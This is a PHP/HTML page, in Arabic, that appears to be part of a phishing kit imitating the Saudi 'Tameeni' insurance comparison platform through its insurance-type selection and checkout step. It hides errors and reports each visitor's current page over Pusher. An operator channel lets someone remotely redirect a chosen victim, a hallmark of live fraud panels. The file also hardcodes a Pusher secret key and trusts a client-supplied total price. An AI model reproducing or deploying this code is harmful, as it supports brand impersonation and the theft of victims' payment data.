<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'أنواع التأمين');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'أنواع التأمين'
    ];

    $pusher->trigger('temaeen-new', 'curreneft-page', $dataa);
}

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $_SESSION['totalprice'] = $_POST['totalprice'];
    $_SESSION['image'] = $_POST['image'];

    echo "<script>document.location.href='summary.php';</script>";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأميني المنصة الأولى لمقارنة أسعار تأمين المركبات والطبي وسفر وأخطاء طبية اونلاين في السعودية</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        /* body {
            height: 2000vh;
        } */

        .bacOne {
            background-color: #0088eb;
        }

        .fa-solid,
        label {
            color: rgb(153, 153, 153);
        }

        label {
            font-weight: bold;
            font-size: 14px;
        }

        .fa-solid.active {
            color: rgb(194, 77, 141) !important;
        }

        .text-primary {
            color: #0088eb !important;
        }

        .text-muted {
            color: rgb(153, 153, 153) !important;
        }

        ::placeholder {
            color: #d2d6da !important;
        }

        .bg-two {
            background-color: #0088eb;
        }

        .form-check-input:checked {
            background-color:#76b740 !important;
            /* Bootstrap primary color or your custom color */
            border-color:#76b740;
        }

        /* Optional: Change the check mark dot color (on some browsers) */

        .form-check-input {
            width: 1.1em;
            height: 1.1em;
            border: 1px solid gray;
            /* Blue border, 2px thick */
        }

        .group {
            display: flex;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            height: 40px;
        }

        .bg-one {
            background-color: #0088eb;
            height: 40px;
            color: #f8f9fa;
        }

        .bg-o-two {
            height: 40px;
            height: 40px;
            background-color: rgb(240, 240, 240);
            color: rgb(153, 153, 153) !important;
        }

        .bg-a-two {
            height: 40px;
            background-color: rgb(230, 228, 228);
            color: rgb(153, 153, 153) !important;
        }

        .forShow {
            display: flex;
            gap: 10px;
        }

        .ajamaclas {
            display: flex;
            justify-content: start;
            align-items: center;
        }

        .active {
            background-color: #d4eef5;
            border: 1px solid #b9e4f0;
        }

        .bdgs {
            background-image: url(./assets/TPL.svg);
            background-repeat: no-repeat;
            background-size: 100% 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 45px;
        }
    </style>
</head>

<body class="bg-light">

    <nav class="d-flex justify-content-center py-2 shadow-sm">
        <a href="index.php">
            <img src="./assets/tamini-removebg-preview.png" width="150"  alt="">
        </a>
    </nav>

    <h6 class="text-center my-4 text-primary fw-bold">نوع التأمين</h6>

    <div class="container gap-2 d-flex">
        <div class="insurance-option d-flex gap-4 align-items-center active py-2 pe-2 ps-4 flex-fill shadow" data-type="1" style="border-radius: 25px;">
            <img src="./assets/q-icon-3.svg" width="30" alt="">
            <span class="text-primary fw-bold" style="font-size: 11px;">ضد الغير</span>
        </div>
        <div class="insurance-option d-flex gap-4 align-items-center  py-2 pe-2 ps-4 flex-fill shadow" data-type="2" style="border-radius: 25px;">
            <img src="./assets/car-crash-plus.svg" width="30" alt="">
            <span class="text-primary fw-bold" style="font-size: 11px;">مميز</span>
        </div>
        <div class="insurance-option d-flex gap-4 align-items-center  py-2 pe-2 ps-4 flex-fill shadow" data-type="3" style="border-radius: 25px;">
            <img src="./assets/q-icon-2.svg" width="30" alt="">
            <span class="text-primary fw-bold" style="font-size: 11px;">شامل</span>
        </div>
    </div>

    <hr class="active mt-5 mb-4">

    <div class="container" style="margin-bottom: 100px;">
        <div class="row d-flex flex-column gap-5" id="puDataHere">
        </div>
    </div>
<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            fetchData(1); // Default to the first type
        });

        function fetchData(type) {
            fetch('data.json') // path to your JSON file
                .then(response => response.json())
                .then(data => {
                    const container = document.getElementById("puDataHere");
                    container.innerHTML = '';

                    data.find(x => x.id == type).data.forEach(item => {
                        const card = document.createElement("div");
                        card.className = "col-12";
                        card.style.backgroundColor = "#f6f7f7";

                        card.innerHTML = `
                    <div  style="margin-bottom: -30px;">
                    <img src="./assets/${item.img}" width="60" alt="">
                    </div>
                    <div class="d-flex justify-content-end">
                        <div class="bdgs w-75 text-center">
                            <small class="fw-bold text-primary"> ${item.title}</small>
                        </div>
                    </div>
                </div>
                <div class="mt-4">
                    <h6 class="fw-bold text-primary mb-4">المنافع الإضافية</h6>
                    <div class="d-flex flex-column gap-2">
                        ${
                            item.extra.map(extra => `
                            <div class="d-flex justify-content-between align-items-center">
                                <div class="d-flex align-items-center gap-2">
                                    <input type="checkbox" class="form-check-input" onclick="setAmount(this, ${item.id}, ${extra.price})" id="check1" name="check1" ${extra.clicked ? 'checked disabled' : ''} required>
                                    <label for="" class="text-primary d-flex gap-5" style="font-size: 11px;"> ${extra.title} </label>
                                </div>
                                <span class="text-primary fw-bold" style="font-size: 12px;">${extra.price == '' ? '' : `${extra.price} ريال`}</span>
                            </div>
                            `).join('')
                        }
                    </div>
                   <!-- <div class="px-4 mt-4">
                        <div class="d-flex bg-white" style="border: 1px solid #0c5380;border-radius: 10px;">
                            <img src="./assets/Tabby-ar.svg" style="width: 7rem !important;" class="img-fluid" alt="">
                            <div class="d-flex justify-content-center align-items-center flex-fill">
                                <small class="fw-bold text-primary" style="font-size: 12px;">${item.firprice} ريال ( قسطها أربع دفعات )</small>
                            </div>
                        </div>
                    </div> -->
                </div>
                <div class="mt-4 d-flex gap-2 justify-content-center">
                    <div class="d-flex justify-content-center align-items-center px-4 " style="border: 1px solid #226894;border-top: none;border-bottom: none;">
                        <small class="fw-bold text-primary">الشروط والأحكام</small>
                    </div>
                    <div class="text-center flex-fill pt-2" style="border: 2px solid #76b740;border-radius: 10px;">
                        <h6 class="text-primary fw-bold">الإجمالي</h6>
                        <h6 class="text-primary fw-bold"><span id="totalPriceText${item.id}">${item.totalprice}</span> ريال</h6>
                        <form action="" method="POST">
                            <input type="hidden" id="totalprice${item.id}" name="totalprice" value="${item.totalprice}">
                            <input type="hidden" name="image" value="${item.img}">
                           <button type="submit" name="submit" style="background-color: #76b740;" class="w-100 btn btn-sm fw-bold text-white">اشتري الآن</button>
                        </form>
                    </div>
                </div>
                <div class="mt-3 py-2" style="background-color: #0c5380;border-radius: 0 0 10px 10px;">

                </div>
                `;

                        container.appendChild(card);
                    });
                })
                .catch(err => console.error("Failed to load JSON:", err));
        }


        document.querySelectorAll('.insurance-option').forEach(option => {
            option.addEventListener('click', function() {
                // 1. Remove 'red' class from all
                document.querySelectorAll('.insurance-option').forEach(el => el.classList.remove('active'));

                // 2. Add 'red' to clicked one
                this.classList.add('active');

                const selectedType = this.dataset.type;

                fetchData(selectedType);
            })
        });


        function setAmount(checkbox, id, price) {
            const totalPriceText = document.getElementById(`totalPriceText${id}`);
            const totalPriceInput = document.getElementById(`totalprice${id}`);

            currentTotal = parseFloat(totalPriceInput.value);
            if (checkbox.checked) {
                currentTotal += parseFloat(price);
            } else {
                currentTotal -= parseFloat(price);
            }
            currentTotal = parseFloat(currentTotal.toFixed(2));

            totalPriceInput.value = currentTotal;
            totalPriceText.innerText = currentTotal.toLocaleString();
        }
    </script>
</body>

</html>